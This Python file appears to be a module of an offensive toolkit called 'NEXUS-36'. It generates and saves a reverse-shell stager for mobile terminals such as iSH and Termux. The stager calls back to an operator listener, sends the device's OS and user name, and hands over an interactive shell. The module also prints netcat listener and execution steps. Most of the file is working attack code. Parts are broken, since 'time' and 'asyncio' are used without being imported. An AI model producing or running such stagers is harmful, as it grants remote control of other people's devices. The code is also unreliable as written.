#!/usr/bin/env python3
"""
NEXUS-36 — MOBILE C2 STAGER & DEPLOYER
Module: C2_DEPLOYER
Version: 3.0 — Offensive Red Team Callback & Telemetry Engine

Responsibilities:
- Generates resilient Python reverse shell stagers for mobile execution (iSH, a-Shell, Termux).
- Performs pre-deployment socket verification against operator listener nodes.
- Exfiltrates stager artifacts and execution telemetry to persistent storage.

Python 3.9+
"""

from __future__ import annotations

import os
import sys
import socket
import time
import json
from pathlib import Path
from datetime import datetime, timezone

MODULE = "C2_DEPLOYER"
VERSION = "3.0"

BASE_DIR = Path(__file__).resolve().parent.parent
PAYLOAD_DIR = BASE_DIR / "reports" / "payloads"
EVIDENCE_DIR = BASE_DIR / "nexus_evidence"


def timestamp():
    return datetime.now(timezone.utc).isoformat()


def generate_python_reverse_shell_stager(listener_ip: str, listener_port: int) -> str:
    """
    Generates an elite, resilient Python reverse shell stager engineered for 
    mobile execution environments (iSH, a-Shell, Termux) featuring automatic 
    shell resolution and telemetry pre-dumping.
    """
    stager_code = f'''# NEXUS-36 Elite Mobile C2 Reverse Shell Stager (Production Grade)
import socket, subprocess, os, sys, platform

def resolve_mobile_shell():
    """Dynamically resolves available shell binaries in restricted environments."""
    for candidate in ["/bin/bash", "/bin/sh", "/system/bin/sh", "sh"]:
        if os.path.exists(candidate) or candidate == "sh":
            return candidate
    return "sh"

def spawn_c2_shell():
    HOST = "{listener_ip}"
    PORT = {listener_port}
    
    # Retry loop for mobile network instability (common in field red-teaming)
    max_retries = 3
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10.0)
            s.connect((HOST, PORT))
            s.settimeout(None)
            
            # Send initial host telemetry handshake upon connection
            telemetry = f"[+] HANDSHAKE // OS: {{platform.system()}} {{platform.release()}} // User: {{os.getenv('USER', 'unknown')}}\\n"
            s.sendall(telemetry.encode("utf-8"))
            
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            shell_bin = resolve_mobile_shell()
            subprocess.call([shell_bin, "-i"])
            break
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
            else:
                sys.exit(1)

if __name__ == "__main__":
    spawn_c2_shell()
'''
    PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)
    payload_path = PAYLOAD_DIR / "c2_stager.py"
    payload_path.write_text(stager_code, encoding="utf-8")
    return str(payload_path)


def verify_listener_socket(listener_ip: str, listener_port: int, timeout: float = 2.0) -> bool:
    """
    Actively checks if the operator listener node is listening on the specified port 
    before declaring stager deployment successful.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((listener_ip, listener_port))
        s.close()
        return result == 0
    except Exception:
        return False


def deploy_c2_stager(listener_ip: str = "10.0.0.5", listener_port: int = 4444) -> str:
    """Compiles stager payload and verifies operator listener status."""
    print(f"\n\033[95m[{MODULE}] INITIALIZING ELITE C2 CALLBACK STAGER MODULE\033[0m")
    path = generate_python_reverse_shell_stager(listener_ip, listener_port)
    
    # Active listener verification check
    listener_active = verify_listener_socket(listener_ip, listener_port)
    
    print(f" \033[92m[+] Mobile C2 Stager compiled successfully -> Saved to: {path}\033[0m")
    if listener_active:
        print(f" \033[92m[+++] LISTENER VERIFIED: Active listener detected on {listener_ip}:{listener_port}!\033[0m")
    else:
        print(f" \033[93m[!] WARNING: No active listener detected on {listener_ip}:{listener_port}.\033[0m")
        
    print(f" \033[93m[*] Operator Listener Instructions:\033[0m")
    print(f"     1. Run netcat on your listener node: nc -lvnp {listener_port}")
    print(f"     2. Execute stager on target/mobile terminal: python3 {path}\n")

    # Save deployment metadata to evidence
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    evidence_record = {
        "module": MODULE,
        "version": VERSION,
        "timestamp": timestamp(),
        "listener_ip": listener_ip,
        "listener_port": listener_port,
        "listener_active": listener_active,
        "payload_path": path
    }
    evidence_file = EVIDENCE_DIR / f"c2_deploy_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"
    evidence_file.write_text(json.dumps(evidence_record, indent=4), encoding="utf-8")

    return path


# -------------------------------------------------------------
# ENGINE-COMPATIBLE ENTRY POINT
# -------------------------------------------------------------

async def run_c2_deployer(
    cognitive_operator=None,
    listener_ip="10.0.0.5",
    listener_port=4444,
    **kwargs
):
    if cognitive_operator and isinstance(cognitive_operator, str) and "." in cognitive_operator:
        listener_ip = cognitive_operator

    return await asyncio.to_thread(deploy_c2_stager, listener_ip, listener_port)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="NEXUS-36 Mobile C2 Deployer")
    parser.add_argument("--ip", default="10.0.0.5", help="Listener IP address")
    parser.add_argument("--port", type=int, default=4444, help="Listener Port")
    args = parser.parse_args()

    deploy_c2_stager(args.ip, args.port)
